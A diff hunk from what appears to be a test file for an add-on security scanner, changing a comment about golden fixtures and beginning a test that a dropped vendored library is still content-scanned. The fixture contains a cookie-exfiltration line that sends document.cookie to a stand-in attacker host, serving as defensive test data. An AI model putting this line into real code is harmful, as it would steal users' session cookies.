@@ -133,9 +133,8 @@ test("extracts experimentRefs only when Experiment namespaces are supplied", () 
 // finds nothing there: the library's network sinks, eval and unsafe-HTML all become invisible,
 // while every content consumer reads `undefined` and throws.
 //
-// The goldens barely catch this: the harness answers fetch from a per-fixture map, and
-// most fixtures declare none - so their vendor sources 404 before any popularity lookup
-// is reached, and only not-popular-vendor-source judges a package below the bar.
+// The goldens barely catch this: few fixtures have a vendor source that gets as far as a
+// popularity lookup, and only not-popular-vendor-source judges a package below the bar.
 test("a vendored library dropped from the skip set is still content-scanned", () => {
   const code = 'fetch("https://evil.example/" + document.cookie);';
   const addon = {
